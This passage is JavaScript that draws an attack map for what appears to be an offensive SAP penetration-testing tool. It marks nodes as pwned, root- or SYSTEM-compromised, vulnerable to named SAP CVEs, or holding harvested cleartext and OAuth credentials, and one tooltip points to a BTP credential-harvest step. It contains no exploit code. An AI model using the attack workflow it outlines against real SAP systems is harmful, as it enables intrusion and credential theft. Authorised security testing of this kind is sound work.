      `onmousedown="startDrag(event,'${sid}')" ` +
      `oncontextmenu="showCtxMenu(event,'${sid}')" >`;

    // Box
    html += `<rect x="${x}" y="${y}" width="${BOX_W}" height="${BOX_H}" ` +
      `rx="6" fill="${fill}" stroke="${borderColor}" stroke-width="${borderWidth}"${nodeDash} />`;
    if (isBtpDiscovered) {
      // Tiny "via BTP" tag in the top-right corner so the dashed
      // border isn't the only visual signal.
      html += `<text x="${x+BOX_W-8}" y="${y+18}" text-anchor="end" ` +
        `font-size="10" fill="#a371f7" font-family="monospace" ` +
        `font-weight="bold">via BTP</text>`;
    } else if (isWdDiscovered) {
      // "via WD <sid>" — names the WD that revealed this backend
      // so the operator can find the routing edge that supplied
      // the placeholder identity.
      const tag = `via WD ${escHtml(n.discovered_via_wd_sid)}`;
      html += `<text x="${x+BOX_W-8}" y="${y+18}" text-anchor="end" ` +
        `font-size="10" fill="#4d9eb6" font-family="monospace" ` +
        `font-weight="bold">${tag}</text>`;
    }

    // Header band
    html += `<rect x="${x}" y="${y}" width="${BOX_W}" height="28" rx="6" fill="${borderColor}" opacity="0.25" />`;

    // SID
    html += `<text x="${x+10}" y="${y+18}" fill="#fff" font-size="13" ` +
      `font-weight="bold" font-family="monospace">${escHtml(n.sid || sid)}</text>`;

    // System type pill
    const stype = (n.system_type || '').toUpperCase();
    const pillColor = PILL_COLORS[stype] || '#788fa6';
    const pillLabel = PILL_LABELS[stype] || stype;
    if (pillLabel) {
      const px = x + 10 + (n.sid || sid).length * 8 + 8;
      if (stype === 'ABAP+JAVA') {
        html += `<rect x="${px}" y="${y+4}" width="58" height="18" rx="9" fill="#0070f2" />`;
        html += `<rect x="${px+28}" y="${y+4}" width="30" height="18" rx="9" fill="#d27700" />`;
        html += `<text x="${px+29}" y="${y+16}" text-anchor="middle" font-size="8" fill="#fff" font-weight="bold">${pillLabel}</text>`;
      } else {
        html += `<rect x="${px}" y="${y+4}" width="${pillLabel.length*7+12}" height="18" rx="9" fill="${pillColor}" />`;
        html += `<text x="${px + (pillLabel.length*7+12)/2}" y="${y+16}" text-anchor="middle" font-size="9" fill="#fff" font-weight="bold">${escHtml(pillLabel)}</text>`;
      }

      // DB pill
      const dbType = (n.db_type || '').toUpperCase();
      const dbPillColor = PILL_COLORS[dbType];
      const dbPillLabel = PILL_LABELS[dbType];
      if (dbPillColor && dbPillLabel) {
        const dpx = px + (pillLabel.length*7+12) + 6;
        html += `<rect x="${dpx}" y="${y+4}" width="${dbPillLabel.length*7+10}" height="18" rx="9" fill="${dbPillColor}" />`;
        html += `<text x="${dpx + (dbPillLabel.length*7+10)/2}" y="${y+16}" text-anchor="middle" font-size="8" fill="#fff" font-weight="bold">${escHtml(dbPillLabel)}</text>`;
      }
    }

    // Lightning bolt for pwned — sits in the top-right corner, partly
    // outside the box (mirror of the finding badge in the top-left).
    if (n.pwned) {
      const lx = x + BOX_W + 2, ly = y - 2;
      html += `<text x="${lx}" y="${ly}" font-size="28" fill="#f0883e"`
        + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
        + ` text-anchor="middle" dominant-baseline="middle"`
        + ` font-weight="bold" pointer-events="none">&#9889;</text>`;
    }
    // Root badge — shown when ANY of the Linux LPE techniques
    // (Copy Fail / pedit-COW / Dirty Frag) has obtained root.
    if (n.copyfail_root_obtained || n.dirtyfrag_root_obtained
        || n.peditcow_root_obtained) {
      html += `<text x="${x+BOX_W-30}" y="${y-2}" font-size="22" fill="#e6edf3"`
           + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
           + ` text-anchor="middle" dominant-baseline="middle"`
           + ` font-weight="bold" pointer-events="none">&#9650;</text>`;
    }
    // SYSTEM badge — Windows mirror of the Linux root triangle.
    // Shown when ANY of the three Windows LPE techniques (EfsPotato,
    // GodPotato, MiniPlasma) has landed an NT AUTHORITY\SYSTEM
    // command on this host.  Same position as the Linux triangle
    // (mutually exclusive in practice - a SAPNode is either Linux
    // or Windows), but a distinct shape (diamond) and colour
    // (Windows blue) so a glance at the map immediately tells you
    // which OS the privilege escalation landed on.  Hover tooltip
    // names the technique that won so the operator doesn't have
    // to pop the side panel to find out.
    if (n.efspotato_system_obtained || n.godpotato_system_obtained
        || n.miniplasma_system_obtained) {
      const winLpeMethod = n.efspotato_system_obtained ? 'EfsPotato'
                          : n.godpotato_system_obtained ? 'GodPotato'
                          : 'MiniPlasma';
      html += `<text x="${x+BOX_W-30}" y="${y-2}" font-size="22" fill="#58a6ff"`
           + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
           + ` text-anchor="middle" dominant-baseline="middle"`
           + ` font-weight="bold" pointer-events="none">`
           + `<title>NT AUTHORITY\\SYSTEM obtained via ${winLpeMethod}</title>`
           + `&#9670;</text>`;
    }

    // Finding badge — count of unresolved (undismissed) CRITICAL/HIGH
    // for this SID.  Renders as a small numbered dot in the top-left
    // corner so it doesn't fight the pwned bolt in the top-right.
    const fCount = _nodeFindingCount(sid);
    if (fCount.count > 0) {
      const fill = fCount.worst === 'CRITICAL' ? '#e74c3c'
                 : fCount.worst === 'HIGH'     ? '#f0883e'
                 : fCount.worst === 'MEDIUM'   ? '#d29922'
                 :                                '#388bfd';
      // Nudge the badge outside the top-left corner (half above / half
      // left) so it doesn't cover the SID text inside the box.
      const bx = x - 4, by = y - 4;
      const tipTop = `${fCount.count} unresolved finding(s) on the live findings bus`
                   + ` — worst: ${fCount.worst}.`
                   + `\n\nAny emit_finding() event (CVE hits, SAProuter info leak,`
                   + ` SecStore decrypt, default creds, LPE probes, …) that the`
                   + ` operator has NOT dismissed via the bell icon.`
                   + ` Colour follows the worst severity in the bucket.`
                   + `\n\nClick the bell in the toolbar to review / dismiss.`;
      html += `<g style="cursor:help">`
        + `<title>${escHtml(tipTop)}</title>`
        + `<circle cx="${bx}" cy="${by}" r="8" fill="${fill}"`
        + ` stroke="#0d1117" stroke-width="1.5"></circle>`
        + `<text x="${bx}" y="${by+3}" font-size="10" fill="#fff"`
        + ` text-anchor="middle" font-weight="700" font-family="monospace"`
        + ` pointer-events="none">${fCount.count}</text>`
        + `</g>`;
    }

    // Activity spinner for active background tasks
    if (_nodeHasActiveTask(sid)) {
      const cx = x + BOX_W - 18;
      html += `<circle cx="${cx}" cy="${y+14}" r="6" fill="none" stroke="#f0883e" stroke-width="2" stroke-dasharray="20 12" stroke-linecap="round">` +
        `<animateTransform attributeName="transform" type="rotate" from="0 ${cx} ${y+14}" to="360 ${cx} ${y+14}" dur="1s" repeatCount="indefinite" /></circle>`;
    }

    // Instance info
    let ty = y + 38;
    const instances = n.instances || [];
    const instNrs = instances.map(i => i.instance_nr).filter(i => i !== 'XX').sort();
    if (instNrs.length > 0) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Inst: ${escHtml(instNrs.join(', '))}</text>`;
      ty += 14;
    }

    // Hostname
    if (n.hostname) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Host: ${escHtml(n.hostname)}</text>`;
      ty += 14;
    }

    // IP address
    if (n.ip) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">IP: ${escHtml(n.ip)}</text>`;
      ty += 14;
    }

    // SAProuter indicator
    if (n.saprouter) {
      html += `<text x="${x+10}" y="${ty}" fill="#d29922" font-size="9" font-family="monospace">&#128268; via SAProuter</text>`;
      ty += 14;
    }

    // OS
    if (n.os_type) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">OS: ${escHtml(n.os_type)}</text>`;
      ty += 14;
    }

    // DB type
    if (n.db_type) {
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">DB: ${escHtml(n.db_type)}</text>`;
      ty += 14;
    }

    // Clients
    const clients = n.clients || [];
    if (clients.length > 0) {
      const clientStr = clients.slice(0, 6).map(c => typeof c === 'object' ? (c.nr||'?') : String(c)).join(', ') +
        (clients.length > 6 ? ` (+${clients.length-6})` : '');
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Clients: ${escHtml(clientStr)}</text>`;
      ty += 14;
    }

    // Open ports (collected from all instances) — truncate to fit box
    const allPorts = new Set();
    for (const inst of (n.instances || [])) {
      for (const p of Object.keys(inst.ports || {})) allPorts.add(parseInt(p));
    }
    if (allPorts.size > 0) {
      const sorted = [...allPorts].sort((a,b) => a-b);
      let portStr = '';
      for (const p of sorted) {
        const next = portStr ? ', ' + p : String(p);
        if (portStr.length + next.length > 30) { portStr += '...'; break; }
        portStr += next;
      }
      html += `<text x="${x+10}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Ports: ${escHtml(portStr)}</text>`;
      ty += 14;
    }

    // PRD indicator bar
    if (n.is_production) {
      html += `<rect x="${x+10}" y="${y+BOX_H-28}" width="${BOX_W-20}" height="8" rx="4" fill="#8b0000" opacity="0.7" />`;
      html += `<text x="${x+BOX_W/2}" y="${y+BOX_H-32}" text-anchor="middle" font-size="9" fill="#f85149" font-weight="bold">PRD</text>`;
    } else if (clients.length > 0) {
      const rolesKnown = clients.some(c => typeof c === 'object' && c.category);
      const barLabel = rolesKnown ? 'Non-PRD' : 'Clients found — roles unknown';
      html += `<rect x="${x+10}" y="${y+BOX_H-28}" width="${BOX_W-20}" height="8" rx="4" fill="#e67e22" opacity="0.4" />`;
      html += `<text x="${x+BOX_W/2}" y="${y+BOX_H-32}" text-anchor="middle" font-size="8" fill="#e67e22" opacity="0.7">${barLabel}</text>`;
    }

    // Business impact badge row (small icons for each finding)
    const impactResults = (n.impact_results || []).filter(r => r.record_count > 0);
    if (impactResults.length > 0) {
      const maxImpSev = Math.max(...impactResults.map(r => r.severity || 1));
      const impColor = maxImpSev >= 5 ? '#e74c3c' : maxImpSev >= 4 ? '#e67e22' : '#d29922';
      // Impact bar at the bottom of the box
      html += `<rect x="${x+10}" y="${y+BOX_H-14}" width="${BOX_W-20}" height="10" rx="3" fill="${impColor}" opacity="0.2" />`;
      // Show scenario icons (up to 6)
      const icons = impactResults.slice(0, 6).map(r => r.icon || '?');
      const iconStr = icons.join(' ');
      html += `<text x="${x+BOX_W/2}" y="${y+BOX_H-6}" text-anchor="middle" font-size="9" fill="${impColor}" opacity="0.9">${iconStr} ${impactResults.length} impacts</text>`;
    }

    // Finding count badge — matches the vulnerability rows shown in the System Details panel
    const isJava = (n.system_type || '').toUpperCase().indexOf('JAVA') !== -1;
    const vulnList = [];
    if (n.gw_vulnerable) vulnList.push('Gateway SAPXPG (10KBLAZE)');
    if (n.ms_vulnerable) vulnList.push('MS betrusted (CVE-2020-6207)');
    if (isJava && n.cve_2025_31324_vulnerable) vulnList.push('CVE-2025-31324 (Java VisualComposer)');
    if (isJava && n.cve_2020_6287_vulnerable) vulnList.push('CVE-2020-6287 (RECON)');
    if (n.cve_2022_22536_vulnerable) vulnList.push('CVE-2022-22536 (ICMAD)');
    const vulnCount = vulnList.length;
    if (vulnCount > 0) {
      // All of these map to critical severity (5)
      const badgeColor = '#da3633';
      const tipBot = `${vulnCount} confirmed exploit primitive(s) flipped on this node:`
                   + `\n  • ` + vulnList.join('\n  • ')
                   + `\n\nThese are persistent booleans on the SAPNode model`
                   + ` (gw_vulnerable, ms_vulnerable, cve_…_vulnerable).`
                   + ` Survive across sessions and are NOT cleared by`
                   + ` dismissing findings in the bell-icon log.`;
      html += `<g style="cursor:help">`
        + `<title>${escHtml(tipBot)}</title>`
        + `<circle cx="${x+BOX_W-14}" cy="${y+BOX_H-14}" r="11" fill="${badgeColor}" />`
        + `<text x="${x+BOX_W-14}" y="${y+BOX_H-10}" text-anchor="middle" font-size="10" fill="#fff" pointer-events="none">${vulnCount}</text>`
        + `</g>`;
    }

    // BTP-pivot hint: when SecStore extraction recovered an OAuth
    // 2.0 client_secret (/OA2C/CS_<UUID>_NN row), surface a small
    // cloud icon in the bottom-left corner so the operator notices
    // the system has unexploited cloud-pivot material — even when
    // the harvest hasn't been kicked off yet.  Hover for the next
    // step.
    const _hasOauthSecret = (n.secstore_entries || []).some(
      e => e && e.category === 'oauth2_client');
    if (_hasOauthSecret) {
      const cx = x + 18, cy = y + BOX_H - 14;
      html += `<g pointer-events="all" style="cursor:help">`
           + `<title>OAuth 2.0 client_secret in SecStore — choose `
           + `Exploitation → Harvest BTP Credentials to read `
           + `destinations from connected BTP tenants</title>`
           + `<circle cx="${cx}" cy="${cy}" r="11" fill="#0e2636" `
           + `stroke="#a371f7" stroke-width="1.5" />`
           + `<text x="${cx}" y="${cy+5}" text-anchor="middle" `
           + `font-size="14" fill="#a371f7" pointer-events="none">`
           + `&#9729;</text>`
           + `</g>`;
    }

    html += '</g>';
  });

  // --- Draw SAP Cloud Connector nodes (hexagonal frame, distinct teal fill) ---
  sccKeys.forEach(host => {
    const sn = sccNodes[host];
    const x = sn._x || 0, y = sn._y || 0;
    const dragId = 'scc:' + host.replace(/'/g, "\\'");
    const sccFill = '#0d2a2e';        // dark teal-tinted fill
    const sccStroke = '#046c7a';      // matches CLOUD_CONNECTOR pill
    const cveCount = ((sn.cves_confirmed || []).length + (sn.cves_suspected || []).length);
    const borderC = sn.pwned ? '#8b0000' : (cveCount > 0 ? '#d29922' : sccStroke);
    const borderW = sn.pwned ? 6 : 4;

    html += `<g class="node-box" data-host="${escHtml(host)}" `
         + `onmousedown="startDrag(event,'${dragId}')" `
         + `oncontextmenu="showSCCCtxMenu(event,'${escHtml(host)}')" `
         + `onclick="showSCCDetail('${escHtml(host)}')">`;

    // Hexagon path — flat-top hex inscribed in BOX_W x BOX_H
    const hx = x, hy = y, hw = BOX_W, hh = BOX_H;
    const cut = 22;  // hex shoulder cut
    const hex = `M${hx+cut},${hy} L${hx+hw-cut},${hy} L${hx+hw},${hy+hh/2} `
              + `L${hx+hw-cut},${hy+hh} L${hx+cut},${hy+hh} L${hx},${hy+hh/2} Z`;
    html += `<path d="${hex}" fill="${sccFill}" stroke="${borderC}" stroke-width="${borderW}" />`;

    // Header band
    html += `<rect x="${x+cut-2}" y="${y}" width="${hw - 2*(cut-2)}" height="26" fill="${sccStroke}" opacity="0.35" />`;

    // Title — "SCC" label only (host moves into body like SAP nodes)
    html += `<text x="${x+cut+4}" y="${y+18}" fill="#fff" font-size="13" font-weight="bold" font-family="monospace">SCC</text>`;

    // Pwned bolt (top-right, mirroring SAP nodes)
    if (sn.pwned) {
      const lx = x + BOX_W + 2, ly = y - 2;
      html += `<text x="${lx}" y="${ly}" font-size="28" fill="#f0883e"`
           + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
           + ` text-anchor="middle" dominant-baseline="middle"`
           + ` font-weight="bold" pointer-events="none">&#9889;</text>`;
    }

    // Body lines — host first (IP or hostname), then details
    let ty = y + 42;
    html += `<text x="${x+cut+4}" y="${ty}" fill="#cfd9df" font-size="11" font-weight="bold" font-family="monospace">${escHtml(host)}</text>`;
    ty += 16;
    if (sn.version) {
      html += `<text x="${x+cut+4}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Version: ${escHtml(sn.version)} (${escHtml(sn.version_source || '?')})</text>`;
      ty += 14;
    }
    if (sn.server_header) {
      html += `<text x="${x+cut+4}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Server: ${escHtml(sn.server_header.slice(0, 26))}</text>`;
      ty += 14;
    }
    if (sn.tls_fingerprint && sn.tls_fingerprint.tls_version) {
      const tv = sn.tls_fingerprint.tls_version;
      html += `<text x="${x+cut+4}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">TLS: ${escHtml(tv)}</text>`;
      ty += 14;
    }
    if (sn.bundle_hash) {
      html += `<text x="${x+cut+4}" y="${ty}" fill="#6e7681" font-size="9" font-family="monospace">bundle: ${escHtml(sn.bundle_hash.slice(0, 14))}</text>`;
      ty += 14;
    }
    html += `<text x="${x+cut+4}" y="${ty}" fill="#8b949e" font-size="10" font-family="monospace">Port: ${sn.admin_ui_port || 8443}</text>`;
    ty += 14;

    // CVE / status badge — bottom-right inside hex
    if (cveCount > 0) {
      const badgeColor = sn.pwned ? '#e74c3c' : '#d29922';
      html += `<circle cx="${x+BOX_W-cut-6}" cy="${y+BOX_H-14}" r="10" fill="${badgeColor}" />`;
      html += `<text x="${x+BOX_W-cut-6}" y="${y+BOX_H-10}" text-anchor="middle" font-size="10" fill="#fff" font-weight="bold">${cveCount}</text>`;
    }

    // Principal-Propagation weak-rule badge — bottom-left inside hex.
    // Only renders when the analyser has seen something CRITICAL/HIGH;
    // colour follows severity-style convention (red for CRITICAL,
    // amber for HIGH-only).  Tooltip surfaces the count breakdown.
    const ppWeak = sn.pp_weak_count || 0;
    const ppSummary = ((sn.pp_analysis || {}).summary) || {};
    if (ppWeak > 0) {
      const ppColor = (ppSummary.critical || 0) > 0 ? '#f85149' : '#f0883e';
      const ppTip = `PP analyser: ${ppSummary.critical || 0} CRITICAL · ${ppSummary.high || 0} HIGH · ${ppSummary.medium || 0} MEDIUM`;
      html += `<g><title>${escHtml(ppTip)}</title>`
           + `<circle cx="${x+cut+10}" cy="${y+BOX_H-14}" r="10" fill="${ppColor}" />`
           + `<text x="${x+cut+10}" y="${y+BOX_H-10}" text-anchor="middle" font-size="11" fill="#fff" font-weight="bold">PP</text>`
           + `</g>`;
    }

    html += '</g>';
  });

  // --- Draw BTP subaccount nodes (cloud silhouette, sky-blue tint) ---
  btpKeys.forEach(uuid => {
    const bn = btpNodes[uuid];
    const x = bn._x || 0, y = bn._y || 0;
    const dragId = 'btp:' + uuid.replace(/'/g, "\\'");
    const btpFill = '#0e2636';        // dark navy fill
    const btpStroke = '#5dade2';      // sky-blue
    const dests = (bn.destinations || []);
    const cleartextCount = dests.filter(d => d && d.cleartext_captured).length;
    const linkedCount = dests.filter(d => d && d.linked_target_sid).length;
    // pwned / has_critical_finding = red (fully-authenticated
    // kernel-proxy access; parity with GW-exploit / SCC-crack).
    // cert_auth_trusted = purple (mTLS handshake succeeded but
    // this endpoint denied us — transport-trust breach only).
    // cleartextCount > 0 = amber (BTP subaccount destinations
    // gave up cleartext creds).
    const borderC = (bn.pwned || bn.has_critical_finding)
      ? '#8b0000'
      : (bn.cert_auth_trusted
          ? '#8b3aad'
          : (cleartextCount > 0 ? '#d29922' : btpStroke));
    const borderW = (bn.pwned || bn.has_critical_finding)
      ? 6
      : (bn.cert_auth_trusted ? 5 : 4);

    html += `<g class="node-box" data-btp="${escHtml(uuid)}" `
         + `onmousedown="startDrag(event,'${dragId}')" `
         + `onclick="showBTPDetail('${escHtml(uuid)}')" `
         + `oncontextmenu="showBTPCtxMenu(event,'${escHtml(uuid)}')">`;

    // Cloud silhouette: three humps on top, flat-ish bottom.
    // Sized to fit BOX_W (240) x BOX_H (174) with a bit of padding.
    const cloud = `M${x+30},${y+55} `
                + `C${x+10},${y+55} ${x+10},${y+25} ${x+45},${y+30} `
                + `C${x+50},${y+5} ${x+95},${y+5} ${x+105},${y+30} `
                + `C${x+115},${y+10} ${x+160},${y+10} ${x+170},${y+35} `
                + `C${x+205},${y+30} ${x+235},${y+45} ${x+225},${y+70} `
                + `C${x+240},${y+95} ${x+220},${y+125} ${x+195},${y+118} `
                + `L${x+45},${y+118} `
                + `C${x+15},${y+125} ${x+0},${y+95} ${x+18},${y+78} `
                + `C${x+5},${y+65} ${x+15},${y+50} ${x+30},${y+55} Z`;
    html += `<path d="${cloud}" fill="${btpFill}" stroke="${borderC}" stroke-width="${borderW}" />`;

    // Header band ("BTP" label + cloud glyph)
    html += `<text x="${x+BOX_W/2}" y="${y+50}" text-anchor="middle" `
         + `fill="#5dade2" font-size="14" font-weight="bold" `
         + `font-family="monospace" pointer-events="none">&#9729; BTP</text>`;

    // Pwned bolt (top-right)
    if (bn.pwned) {
      const lx = x + BOX_W - 10, ly = y + 18;
      html += `<text x="${lx}" y="${ly}" font-size="28" fill="#f0883e"`
           + ` stroke="#0d1117" stroke-width="2.5" paint-order="stroke"`
           + ` text-anchor="middle" dominant-baseline="middle"`
           + ` font-weight="bold" pointer-events="none">&#9889;</text>`;
    }

    // Body lines — region / subdomain / counts
    const subLabel = bn.display_name || bn.subdomain || uuid.slice(0, 8);
    let ty = y + 75;
    html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#cfd9df" `
         + `font-size="11" font-weight="bold" font-family="monospace">`
         + `${escHtml(subLabel.slice(0, 28))}</text>`;
    ty += 14;
    if (bn.region) {
      html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#8b949e" `
           + `font-size="10" font-family="monospace">Region: ${escHtml(bn.region)}</text>`;
      ty += 13;
    }
    if (bn.subdomain && bn.subdomain !== subLabel) {
      html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#8b949e" `
           + `font-size="10" font-family="monospace">${escHtml(bn.subdomain.slice(0, 28))}</text>`;
      ty += 13;
    }
    html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#8b949e" `
         + `font-size="10" font-family="monospace">`
         + `Destinations: ${dests.length}</text>`;
    ty += 13;
    if (cleartextCount > 0) {
      html += `<text x="${x+BOX_W/2}" y="${ty}" text-anchor="middle" fill="#e74c3c" `
           + `font-size="10" font-weight="bold" font-family="monospace">`
           + `Cleartext: ${cleartextCount}${linkedCount ? ' (' + linkedCount + ' linked)' : ''}</text>`;
      ty += 13;
    }

    // Critical-finding badge
    if (cleartextCount > 0) {
      const badgeColor = bn.pwned ? '#e74c3c' : '#d29922';
      html += `<circle cx="${x+BOX_W-30}" cy="${y+BOX_H-30}" r="10" fill="${badgeColor}" />`;
      html += `<text x="${x+BOX_W-30}" y="${y+BOX_H-26}" text-anchor="middle" `
           + `font-size="10" fill="#fff" font-weight="bold">${cleartextCount}</text>`;
    }

    html += '</g>';
  });

  // Draw DBCON edges (issue #21) — external databases the source
  // ABAP calls via NATIVE_SQL, discovered by pairing RSECTAB
  // /DBCON/<name> entries with the DBCON table.  Each edge is
  // rendered as a database-cylinder-shape node placed to the right
  // of its source, plus a connecting line whose colour reflects
  // probe state (dashed grey = untested, green = reachable, red =
  // unreachable) and a lightning glyph when SAPMAP has planted a
  // user on the target via direct SQL.
  const DB_BOX_W = 150, DB_BOX_H = 100;
  Object.values(nodes).forEach(src => {
    const edges = src.dbcon_edges || [];
    if (!edges.length) return;
    // Stack DBCON nodes vertically BELOW the source.  Prior versions
    // stacked to the RIGHT of the source, but in landscapes with
    // multiple physical hosts the right-side neighbor's SAP nodes
    // sit exactly where the cylinders would land — the collision
    // walk then cascaded down + through the neighbor's zone and
    // ended up at the bottom of the map, well outside the source's
    // own host zone.  Placing them below source keeps them inside
    // the source's zone by default and looks like a natural
    // "outbound accessory" arrangement.
    const srcX = src._x || 0, srcY = src._y || 0;
    const baseX = srcX;                       // source column
    let stackY = srcY + 174 + 20;             // BOX_H (174) + gap
    edges.forEach((e, i) => {
      // Position persistence: DBCON edges are re-materialized from
      // the server on every state poll, which wipes any transient
      // ._x/._y on the JS object.  Keep a client-side dict keyed by
      // "sid|con_name" so drag positions survive the poll cycle
      // (same pattern as unkPositions for unknown-target boxes).
      const posKey = src.sid + '|' + e.con_name;
      // Shared collision predicate — used both for initial placement
      // AND for re-checking a persisted position after new SAP nodes
      // were discovered by a later scan.  Extracted so the two paths
      // stay in sync.
      const _rectOverlap = (ax, ay, aw, ah, bx, by, bw, bh) =>
        ax < bx + bw && ax + aw > bx && ay < by + bh && ay + ah > by;
      const _collides = (tx, ty) => {
        const tw = DB_BOX_W, th = DB_BOX_H;
        // Against SAP nodes
        for (const nk in nodes) {
          const n = nodes[nk];
          if (n === src) continue;   // ok to overlap the source
          if (n._x == null) continue;
          if (_rectOverlap(tx, ty, tw, th,
                            n._x, n._y, 240, 174)) return true;
        }
        // Against SCC nodes
        for (const sk in sccNodes) {
          const sn = sccNodes[sk];
          if (sn._x == null) continue;
          if (_rectOverlap(tx, ty, tw, th,
                            sn._x, sn._y, 240, 174)) return true;
        }
        // Against BTP subaccounts
        for (const bk in btpNodes) {
          const bn = btpNodes[bk];
          if (bn._x == null) continue;
          if (_rectOverlap(tx, ty, tw, th,
                            bn._x, bn._y, 240, 174)) return true;
        }
        // Against other DBCON cylinders already placed
        for (const pk in dbconPositions) {
          if (pk === posKey) continue;
          const p = dbconPositions[pk];
          if (_rectOverlap(tx, ty, tw, th,
                            p._x, p._y, DB_BOX_W, DB_BOX_H)) return true;
        }
        return false;
      };

      // Persistence check.  A previously-placed DBCON position may
      // now overlap a SAP node discovered by a later scan — the
      // original placement walked collision-free against the smaller
      // node set that existed at that time, and the persisted spot
      // was never re-checked.  Re-walk when we detect an overlap,
      // UNLESS the operator explicitly dragged it there (dbconPositions
      // entry carries `pinned: true` after a drag; auto-placed
      // entries don't).  Preserves manual arrangement while still
      // fixing the "cylinder ends up on top of a newly-scanned SAP
      // node" case reported after a fresh scan.
      const _existing = dbconPositions[posKey];
      const _needsRewalk = _existing && !_existing.pinned &&
                             _collides(_existing._x, _existing._y);
      if (_existing && !_needsRewalk) {
        e._x = _existing._x;
        e._y = _existing._y;
      } else {
        if (_needsRewalk) {
          console.log('DBCON auto-reposition: ' + posKey +
                       ' overlapped a newly-scanned node, re-walking');
        }
        // Initial placement: right of source, stacked vertically.
        // Then walk the candidate down + right until it clears
        // every already-placed box (SAP nodes, SCCs, BTPs, other
        // DBCON cylinders).  Prevents the 2-cylinders-on-top-of-a-
        // BTP-cloud pileup the operator screenshotted.
        let cx = baseX, cy = stackY + i * (DB_BOX_H + 24);
        // Try current position; if it collides, step down; if we've
        // walked too far down, jump right and reset y.
        const _STEP = DB_BOX_H + 24;
        let _guard = 0;
        while (_collides(cx, cy) && _guard < 40) {
          cy += _STEP;
          if (cy - (srcY || 0) > 600) {
            cx += DB_BOX_W + 60;
            cy = stackY;
          }
          _guard++;
        }
        e._x = cx; e._y = cy;
        dbconPositions[posKey] = { _x: e._x, _y: e._y };
      }
      const x = e._x, y = e._y;

      // Cylinder silhouette: top ellipse + rectangle body + bottom ellipse arc.
      const rx = DB_BOX_W / 2, ry = 14;
      const cx = x + rx;
      const yTop = y, yBottom = y + DB_BOX_H;
      const yMid = yTop + ry;
      const yBottomBand = yBottom - ry;
      // Fill / border reflect probe state.  Precedence:
      //   is_sap_shape wins the FILL (green background = "SAP DB")
      //   pwned wins the BORDER (orange = "owned")
      //   so a pwned SAP DB looks like a green cylinder with an
      //   orange border + orange label + ⚡, unmistakably distinct
      //   from a non-SAP reachable (yellow) or an unreachable (red).
      let fill = "#1c2128";
      let stroke = "#8b949e";
      let strokeW = 2;
      let labelColor = "#8b949e";
      if (e.reachable && e.is_sap_shape) {
        // Distinctive brighter green fill so SAP-shape reads
        // unmistakably from the non-SAP yellow-brown at any zoom.
        fill = "#0f2e0f";
        stroke = e.pwned ? "#f0883e" : "#3fb950";
        strokeW = e.pwned ? 6 : 4;
        labelColor = e.pwned ? "#f0883e" : "#3fb950";
      } else if (e.reachable) {
        // non-SAP but reachable — yellow; pwned still allowed
        fill = "#2d2c1c";
        stroke = e.pwned ? "#f0883e" : "#d29922";
        strokeW = e.pwned ? 5 : 4;
        labelColor = e.pwned ? "#f0883e" : "#d29922";
      } else if (e.tested) {
        // tested but unreachable — red
        fill = "#2d1c1c"; stroke = "#f85149"; strokeW = 3;
        labelColor = "#f85149";
      }

      // Connecting line follows the same colour language as the border.
      let lineColor, lineDash;
      if (e.reachable && e.is_sap_shape) {
        lineColor = e.pwned ? '#f0883e' : '#3fb950'; lineDash = '';
      } else if (e.reachable) {
        lineColor = e.pwned ? '#f0883e' : '#d29922'; lineDash = '';
      } else if (e.tested) { lineColor = '#f85149'; lineDash = '5,4'; }
      else { lineColor = '#8b949e'; lineDash = '5,4'; }
      // Line origin/target: source's BOTTOM to cylinder's TOP now
      // that DBCON stacks below source instead of to the right.
      // Keeps the connector visually short + inside the host zone.
      const _sx = srcX + 120;      // roughly middle of source (BOX_W=240)
      const _sy = srcY + 174;      // bottom edge of source (BOX_H)
      const _tx = x + DB_BOX_W / 2;
      const _ty = y;               // top edge of cylinder
      const dashAttr = lineDash ? ` stroke-dasharray="${lineDash}"` : '';
      html += `<line x1="${_sx}" y1="${_sy}" x2="${_tx}" y2="${_ty}" `
           + `stroke="${lineColor}" stroke-width="2"${dashAttr} `
           + `pointer-events="none" opacity="0.85" />`;
      // Line label: DBMS / CON_NAME so the operator can identify which
      // DBCON entry the line belongs to when there are multiple.
      const _mx = (_sx + _tx) / 2, _my = (_sy + _ty) / 2 - 4;
      const _lineLbl = `${e.dbms || 'DB'} / ${e.con_name || '?'}`;
      html += `<text x="${_mx}" y="${_my}" text-anchor="middle" `
           + `fill="${lineColor}" font-size="9" font-family="monospace" `
           + `pointer-events="none">${escHtml(_lineLbl)}</text>`;
      // Materialized-target link: if the DBCON's target_sid is on
      // the map as its own SAPNode (auto-materialised via
      // materialize_target_as_sap_node), draw a dashed link from
      // this cylinder to that node.  Makes the DBCON pivot
      // visually obvious — the cylinder becomes "the trust that
      // led us to node X" instead of a mystery box.
      if (e.target_sid && nodes[e.target_sid] &&
          e.target_sid !== src.sid) {
        const tgt = nodes[e.target_sid];
        const tgtX = tgt._x || 0, tgtY = tgt._y || 0;
        // Connect from cylinder centre to left-middle of the SAP box
        const _lx = x + DB_BOX_W / 2, _ly = y + DB_BOX_H / 2;
        const _rx = tgtX, _ry = tgtY + 60;   // node header height
        html += `<line x1="${_lx}" y1="${_ly}" x2="${_rx}" y2="${_ry}" `
             + `stroke="${lineColor}" stroke-width="1.5" `
             + `stroke-dasharray="3,3" opacity="0.7" `
             + `pointer-events="none" />`;
